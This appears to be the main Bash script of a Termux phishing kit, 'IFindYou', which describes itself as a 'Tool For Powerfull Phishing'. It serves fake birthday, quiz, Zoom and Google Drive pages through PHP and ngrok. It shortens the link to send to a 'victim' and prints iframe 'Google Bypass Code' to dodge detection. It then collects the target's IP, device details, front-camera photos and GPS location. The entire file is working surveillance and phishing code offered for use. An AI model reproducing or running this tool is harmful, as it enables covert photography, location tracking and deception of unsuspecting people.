dependencies() {
echo                                                                                                                                          
command -v zip > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed ZIP installing it....." && apt install zip > /dev/null 2>&1;}
command -v php > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed PHP installing it....." && apt install php > /dev/null 2>&1;}            
command -v curl > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed CURL installing it....." && apt install curl > /dev/null 2>&1;}
command -v wget > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed WGET installing it....." && apt install wget > /dev/null 2>&1;}
command -v git > /dev/null 2>&1 || { echo -e >&2 "\e[94m➟ \e[92mNeed GIT installing it....." && apt install git > /dev/null 2>&1;}
echo

}

kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
}

kill_pid
dependencies
banner() {
cd logs
rm -rf result.txt
cd ..
clear
echo -e "  \e[93m██▓     █████▒██▓ ███▄    █ ▓█████▄    ▓██   ██▓ ▒█████   █    ██"
echo -e " ▓██▒   ▓██   ▒▓██▒ ██ ▀█   █ ▒██▀ ██▌    ▒██  ██▒▒██▒  ██▒ ██  ▓██▒"
echo -e " ▒██▒   ▒████ ░▒██▒▓██  ▀█ ██▒░██   █▌     ▒██ ██░▒██░  ██▒▓██  ▒██░"
echo -e " ░██░   ░▓█▒  ░░██░▓██▒  ▐▌██▒░▓█▄   ▌     ░ ▐██▓░▒██   ██░▓▓█  ░██░"
echo -e " ░██░   ░▒█░   ░██░▒██░   ▓██░░▒████▓      ░ ██▒▓░░ ████▓▒░▒▒█████▓"
echo -e " ░▓      ▒ ░   ░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒       ██▒▒▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒"
echo -e "  ▒ ░    ░      ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒     ▓██ ░▒░   ░ ▒ ▒░ ░░▒░ ░ ░"
echo -e "  ▒ ░    ░ ░    ▒ ░   ░   ░ ░  ░ ░  ░     ▒ ▒ ░░  ░ ░ ░ ▒   ░░░ ░ ░"
echo -e " ░             ░           ░    ░        ░ ░         ░ ░     ░"
echo -e "v                              ░          ░ ░\e[0m"
echo -e '                   .:: Developer MishaKorzhik ;:.\e[0m'
echo -e '                .:;: My github.com/mishakorzik :::.\e[0m'
echo -e "\e[92m"
echo -e '                    \e[100mTool For Powerfull Phishing \e[0m'
echo
}
menu() {
echo -e "\e[93m[\e[32m1\e[93m]\e[93m - \e[92mSTART - Start this tool\e[0m"
echo -e "\e[93m[\e[32m2\e[93m]\e[93m - \e[92mUPDATE - Update this tool\e[0m"
echo -e "\e[93m[\e[32m3\e[93m]\e[93m - \e[92mREMOVE - Clear Tool data\e[0m"
echo -e "\e[93m[\e[32m4\e[93m]\e[93m - \e[92mABOUT - About information\e[0m"
echo -e "\e[93m[\e[32m5\e[93m]\e[93m - \e[92mEXIT - Exit out\e[0m"
echo 
echo -ne "\e[92mSelect Option\e[92m: \e[34m" 
read sit
if [[ "$sit" = "1" || "$sit" = "one" ]];
then 
pagemenu
elif [[ "$sit" = "2" || "$sit" = "two" ]];
then
echo -e  " Check Version On github :)"
elif [[ "$sit" = "3" || "$sit" = "three" ]];
then
clear_data
elif [[ "$sit" = "4" || "$sit" = "four" ]];
then
about
elif [[ "$sit" = "5" || "$sit" = "five" ]];
then
exit 1
else
echo -e "\e[93mWrong input :/\e[0m"
exit 1
fi
}

pagemenu() {
banner
echo -e " \e[93m[\e[32m01\e[93m]\e[93m \e[92mSelFie    - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m02\e[93m]\e[93m \e[92mQuIz      - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m03\e[93m]\e[93m \e[92mGuEss     - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m04\e[93m]\e[93m \e[92mSpinWheel - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m05\e[93m]\e[93m \e[92mHopGame   - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m06\e[93m]\e[93m \e[92mBirthDay  - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m07\e[93m]\e[93m \e[92mWishBook  - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m08\e[93m]\e[93m \e[92mRPSGame   - Frontal Camera Hack\e[0m"
echo -e " \e[93m[\e[32m09\e[93m]\e[93m \e[92mNearYou   - Geolocation Hack\e[0m"
echo -e " \e[93m[\e[32m10\e[93m]\e[93m \e[92mZoom      - Geolocation Hack\e[0m"
echo -e " \e[93m[\e[32m11\e[93m]\e[93m \e[92mGDrive    - Geolocation Hack\e[0m"
echo
echo -ne "\e[92mSelect Option\e[92m: \e[34m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "selfie" ]];
then
site="selfie"
rm -rf webs/$site/even.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "quiz" ]]
then
site="quiz"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "3" || "$selc" == "three" || "$selc" == "guess" ]]
then
site="guess"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "4" || "$selc" == "four" || "$selc" == "spinwheel" ]]
then
site="spinwheel"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "5" || "$selc" == "five" || "$selc" == "hopgame" ]] 
then
site="game"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "6" || "$selc" == "six" || "$selc" == "birthday" ]]
then
birthday
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "7" || "$selc" == "seven" || "$selc" == "wishbook" ]]
then
book
elif [[ "$selc" == "8" || "$selc" == "eight" || "$selc" == "rpsgame" ]]
then
site="rps"
rm -rf webs/$site/option.html > /dev/null 2>&1
elif [[ "$selc" == "9" || "$selc" == "nine" || "$selc" == "location" ]]
then
site="location"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "10" || "$selc" == "ten" || "$selc" == "zoom" ]]
then
site="zoom"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "11" || "$selc" == "eleven" || "$selc" == "gdrive" ]]
then
site="gdrive"
rm -rf webs/$site/option.html > /dev/null 2>&1
clear
banner
redirect
start
elif [[ "$selc" == "00" || "$selc" == "exit" || "$selc" == "exit" ]]
then
banner
menu
fi
}

redirect() {
cd webs
cd gdrive
cd js
rm -rf location.js
rm -rf location1.js
rm -rf location2.js
rm -rf location3.js
rm -rf location4.js
cd ..
cd ..
cd ..
echo ""
echo -e " \e[93m[\e[32m01\e[93m]\e[93m \e[92mRedirect  - Redirect to deleted file\e[0m"
echo -e " \e[93m[\e[32m02\e[93m]\e[93m \e[92mRedirect  - Redirect to Image\e[0m"
echo -e " \e[93m[\e[32m03\e[93m]\e[93m \e[92mRedirect  - Refirect to File \e[0m"
echo -e " \e[93m[\e[32m04\e[93m]\e[93m \e[92mRedirect  - Redirect to Video\e[0m"
echo -e " \e[93m[\e[32m05\e[93m]\e[93m \e[92mRedirect  - Redirect to Video\e[0m"
echo -e " \e[93m[\e[32m06\e[93m]\e[93m \e[92mRedirect  - Redirect to Gif\e[0m"

echo ' '
echo -ne "\e[92mSelect Option\e[92m: \e[34m"
read sele
rm -rf /data/data/com.termux/files/home/IFindYou/webs/gdrive/js/location.js

if [[ "$sele" == "1" ]]
then
cd webs
cd gdrive
cd js
cd temp
cp location1.js /data/data/com.termux/files/home/IFindYou/webs/gdrive/js/
cd ..
mv location1.js location.js
cd ..
cd ..
cd ..
fi
if [[ "$sele" == "2" ]]
then
cd webs
cd gdrive
cd js
cd temp
cp location2.js /data/data/com.termux/files/home/IFindYou/webs/gdrive/js/
cd ..
mv location2.js location.js
cd ..
cd ..
cd ..
fi
if [[ "$sele" == "3" ]]
then
cd webs
cd gdrive
cd js
cd temp
cp location3.js /data/data/com.termux/files/home/IFindYou/webs/gdrive/js/
cd ..
mv location3.js location.js
cd ..
cd ..
cd ..
fi
if [[ "$sele" == "4" ]]
then
cd webs
cd gdrive
cd js
cd temp
cp location4.js /data/data/com.termux/files/home/IFindYou/webs/gdrive/js/
cd ..
mv location4.js location.js
cd ..
cd ..
cd ..
fi
if [[ "$sele" == "5" ]]
then
cd webs
cd gdrive
cd js
cd temp
cp location5.js /data/data/com.termux/files/home/IFindYou/webs/gdrive/js/
cd ..
mv location5.js location.js
cd ..
cd ..
cd ..
fi
if [[ "$sele" == "6" ]]
then
cd webs
cd gdrive
cd js
cd temp
cp location6.js /data/data/com.termux/files/home/IFindYou/webs/gdrive/js/
cd ..
mv location6.js location.js
cd ..
cd ..
cd ..
fi

}

birthday() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="birthday"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="birthday"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read person
echo "Wish Message: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "6s|\(.*\)|<legend>  <h2 class="text_head">$event</h2></legend>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "7s|\(.*\)|<h2 class="text">$person</h2>|" webs/$site/option.html > random.html && mv random.html webs/$site
sed "8s|\(.*\)|<h2 class="text">$msg</h2>|" webs/$site/random.html > custom.html && mv custom.html webs/$site
rm -rf webs/$site/random.html > /dev/null 2>&1
start
fi
}

book() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="book"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="book"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "\e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mWish Message: "
read msg
echo
echo -e "\e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "32s|\(.*\)|<p id="head">$event</p>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "33s|\(.*\)|<p>$msg</p>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

boxwish() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m➟ \e[93mDefault\e[0m    \e[92m[\e[34m2\e[92m]\e[92m➟ \e[93mCustom\e[0m "
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read selc
if [[ "$selc" == "1" || "$selc" == "one" || "$selc" == "default" ]];
then
site="boxwish"
rm -rf webs/$site/option.html > /dev/null 2>&1
start
elif [[ "$selc" == "2" || "$selc" == "two" || "$selc" == "custom" ]];
then
site="boxwish"
rm -rf webs/$site/option.html > /dev/null 2>&1
echo " "
echo -e "   \e[94m<<\e[93mcustom options require input actions\e[94m>>\e[92m"
echo " "
echo -e "\e[93mEvent Name: "
read event
echo -e "\e[93mPerson Name: "
read person
echo
echo -e "    \e[94m   <<\e[93mcustom template created\e[94m>>\e[92m"
sed "10s|\(.*\)|<h1>$event</h1>|" webs/$site/$site.html > option.html && mv option.html webs/$site
sed "11s|\(.*\)|<h2>$person</h2>|" webs/$site/option.html > custom.html && mv custom.html webs/$site
start
fi
}

start() {

def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"


if [[ -e webs/$site/ip.txt ]]; then
rm webs/$site/ip.txt 2>&1
fi

if [[ -e webs/$site/index.php ]]; then
rm  webs/$site/index.php 2>&1
fi

if [[ -e webs/$site/index.html ]]; then
rm  webs/$site/index.html 2>&1
fi

if [[ -e webs/$site/Log.log ]]; then
rm webs/$site/Log.log 2>&1
fi

if [[ -e webs/$site/template.html ]]; then
rm  webs/$site/template.html 2>&1
fi

if [[ -e ngrok ]]; then
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Reading directories...\n"
else
sleep 1
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Downloading Ngrok..."
echo " "
arch=$(uname -a | grep -o 'arm')
if [[ $arch == *'arm'* ]]; then
wget https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-2.2.8-linux-arm.zip ]]; then
unzip ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm.zip
else                                                                                                                  
echo
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;92m Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"                              
exit 1
fi
else
wget https://github.com/noob-hackers/impstuff/raw/main/ngrok%2Bwifi%2Bdata.zip > /dev/null 2>&1
if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1                                                            
chmod +x ngrok                                                                                   
rm -rf ngrok+wifi+data.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;92m Unable to download \e[0m\n"
exit
fi                         
fi
fi                                                                                                                   

if [[ -e webs/$site/option.html ]]; then
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92mStarting Host Server..."
cd webs/$site && mv custom.html template.html && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 1
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Starting Ngrok Server..."
./ngrok http $port > /dev/null 2>&1 &
sleep 10
else
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Starting Host Server..."
cd webs/$site && cp $site.html template.html && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 1
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Starting Ngrok Server..."
./ngrok http $port > /dev/null 2>&1 &
sleep 10
fi
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
stat=$(echo "$status")
if [ "$stat" = "200" ];
then
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Link working code \e[34m[\e[0m200\e[34m]\e[0m"
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
echo " "
sed 's+forwarding_link+'$link'+g' webs/$site/template.html > webs/$site/index.html
sed 's+forwarding_link+'$link'+g' webs/$site/forward.php > webs/$site/index.php
shortened1=$(curl https://is.gd/create.php\?format\=simple\&url\="$link")
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Send This Link: \e[0m$link\e[0m"
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Short Link: \e[0m$shortened1\e[0m"
checkfound
else
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Link working code \e[34m[\e[91m000\e[34m]\e[0m"
echo
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
echo " "
sed 's+forwarding_link+'$link'+g' webs/$site/template.html > webs/$site/index.html
sed 's+forwarding_link+'$link'+g' webs/$site/forward.php > webs/$site/index.php
shortened1=$(curl -s -N https://is.gd/create.php\?format\=simple\&url\="$link")
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Send This Link: \e[0m$link\e[0m"
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Short Link: \e[0m$shortened1\e[0m"
#merge
checkfound
fi
}

checkfound() {
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Waiting for victim to open link...\e[0m"
while [ true ]; do
if [[ -e "webs/$site/ip.txt" ]]; then
echo
echo -e "\e[92m------------------------\e[34mVICTIM FOUND\e[92m-------------------------\e[0m"
echo ' '
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Device info found..."
echo ' '
catch_ip
sleep 10
fi
done 
}

catch_ip() {
ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'  webs/$site/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' webs/$site/ip.txt | cut -d '"' -f2)
rm -rf ip.txt
echo -e "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m$ua\e[0m\e[1;77m\e[0m\n"
chk=$(fmt -20 webs/$site/ip.txt)
sch=$(echo "$chk" > cod.txt)                                                                                                         
dom1=$(sed -n '5p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom2=$(sed -n '6p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom3=$(sed -n '7p' cod.txt | cut -d";" -f2 | cut -d")" -f1)
dom4=$(sed -n '11p' cod.txt | cut -d "/" -f1)
dom5=$(sed -n '11p' cod.txt | cut -d " " -f2 | cut -d"/" -f2)
dom6=$(sed -n '12p' cod.txt | cut -d"(" -f2 | cut -d")" -f1)
echo -e " \e[1;92m[\e[0m\e[1;34m★\e[0m\e[1;92m] Kernel:\e[1;0m$dom1\e[0m" 
echo -e " \e[1;92m[\e[0m\e[1;34m★\e[0m\e[1;92m] Os:\e[1;0m$dom2\e[0m"
echo -e " \e[1;92m[\e[0m\e[1;34m★\e[0m\e[1;92m] Model:\e[1;0m$dom3\e[0m"
echo -e " \e[1;92m[\e[0m\e[1;34m★\e[0m\e[1;92m] Browser:\e[0m$dom4\e[0m"
echo -e " \e[1;92m[\e[0m\e[1;34m★\e[0m\e[1;92m] Version:\e[1;0m$dom5\e[0m"
echo -e " \e[1;92m[\e[0m\e[1;34m★\e[0m\e[1;92m] Device:\e[1;0m$dom6\e[0m"
cat webs/$site/ip.txt >> webs/$site/saved.ip.txt

if [[ -e location.txt ]]; then
rm -rf location.txt
fi

IFS='\n'
iptracker=$(curl -s -L "http://ipwhois.app/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
IFS=$'\n'
iptt=$(sed -n 's/"ip"://p' track.txt)

if [[ $iptt != "" ]]; then
echo -e  " \e[1;92m[\e[34m•\e[92m] Device ip: \e[0m$iptt\e[0m"
fi

iptype=$(sed -n 's/"type"://p' track.txt)
if [[ $iptype != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] IP type: \e[0m$iptype\e[0m" 
fi

continent=$(sed -n 's/"continent"://p' track.txt)
if [[ $continent != "" ]]; then
echo -e  " \e[1;92m[\e[34m•\e[92m] Continent: \e[0m$continent\e[0m" 
fi

country=$(sed -n 's/"country"://p' track.txt)
if [[ $country != "" ]]; then
echo -e  " \e[1;92m[\e[34m•\e[92m] Country: \e[0m$country\e[0m"
fi

flag=$(sed -n 's/"country_flag"://p' track.txt)
if [[ $flag != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] Country flag: \e[0m$flag\e[0m"
fi

cap=$(sed -n 's/"country_capital"://p' track.txt)
if [[ $cap != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] Country capital: \e[0m$cap\e[0m"
fi

phon=$(sed -n 's/"country_phone"://p' track.txt)
if [[ $phon != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] Country code: \e[0m$phon\e[0m"
fi

region=$(sed -n 's/"region"://p' track.txt)
if [[ $region != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] State: \e[0m$region\e[0m"
fi

city=$(sed -n 's/"city"://p' track.txt)
if [[ $city != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] City: \e[0m$city\e[0m"
fi

isp=$(sed -n 's/"isp"://p' track.txt)
if [[ $isp != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] Isp: \e[0m$isp\e[0m" 
fi

ccode=$(sed -n 's/"currency_code"://p' track.txt)
if [[ $ccode != "" ]]; then
echo -e " \e[1;92m[\e[34m•\e[92m] Currency code: \e[0m$ccode\e[0m"
fi
echo -e "\e[0m\e[1;92m  |"
rm -rf track.txt
imgrcv
}

imgrcv() {
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Waiting For Image Or Geolocation...\e[0m"
while [ true ]; do
if [[ -e "webs/$site/Log.log" ]]; then
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Recieved..."
sleep 6.0
mv -f webs/$site/*.png /sdcard > /dev/null 2>&1
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Moved To Sdcard..."
rm webs/$site/ip.txt > /dev/null 2>&1
rm webs/$site/Log.log > /dev/null 2>&1
echo
echo -e "\e[92m---------------------\e[34mCHECK YOUR SDCARD\e[92m----------------------\e[0m"
echo
checkfound
fi
if [[ -e "logs/result.txt"  ]]; then
echo -e  " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Geolocation Recieved..."
echo '  |'
cd logs
lon=$(cat result.txt | jq ".lon")
lat=$(cat result.txt | jq ".lat")
acc=$(cat result.txt | jq ".acc")
alt=$(cat result.txt | jq ".alt")
spd=$(cat result.txt | jq ".spd")
dir=$(cat result.txt | jq ".dir")
echo -e " \e[1;92m[\e[34m★\e[92m] Latitude: \e[0m$lat\e[0m"
echo -e " \e[1;92m[\e[34m★\e[92m] Longtitude: \e[0m$lon\e[0m"
echo -e " \e[1;92m[\e[34m•\e[92m] Accuracy: \e[0m$acc\e[0m"
echo -e " \e[1;92m[\e[34m•\e[92m] Altitude: \e[0m$alt\e[0m"
echo -e " \e[1;92m[\e[34m•\e[92m] Direction: \e[0m$dir\e[0m"
echo -e " \e[1;92m[\e[34m•\e[92m] Speed: \e[0m$spd\e[0m"
rm -rf result.txt
cd ..
rm webs/$site/ip.txt > /dev/null 2>&1
rm webs/$site/Log.log > /dev/null 2>&1
echo " "
checkfound
fi
done
}

about() {
clear
echo '
    ┌──────────────────────────────────────────────────────────────┐
    │  	               ┏━┓┏┓ ┏━┓╻ ╻╺┳╸	              │
    │  		       ┣━┫┣┻┓┃ ┃┃ ┃ ┃ 		      │
    │  		       ╹ ╹┗━┛┗━┛┗━┛ ╹ 		      │
    │──────────────────────────────────────────────────────────────│
    │                                                              │
    │ >>   Hi, here you can see my telegram and github there       |
    |       will be questions you will write in telegram.          │
    │                                                              │
    │ >>  Author   :  Misha Korzhik                                │
    │     Github   :  https://github.com/mishakorzik               │
    │     Telegram :  pseudonym @MishaKorzhikTelegram              │
    |     Info     :  Trank for installing I Find You              |
    │                                                              │
    └──────────────────────────────────────────────────────────────┘ 
'|lolcat -a -d 10 -p 1.5 -s 40
sleep 7
cd $HOME/IFindYou
clear
bash main.sh
}

clear_data() {
rm -rf ip.txt
rm -rf track.txt
rm -rf location.txt
rm -rf cod.txt
rm -rf bypass.html
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Removing cache data..."
sleep 2
echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m All Done! Data removed..."
sleep 3
cd $HOME/IFindYou
clear
bash main.sh
}

banner
menu
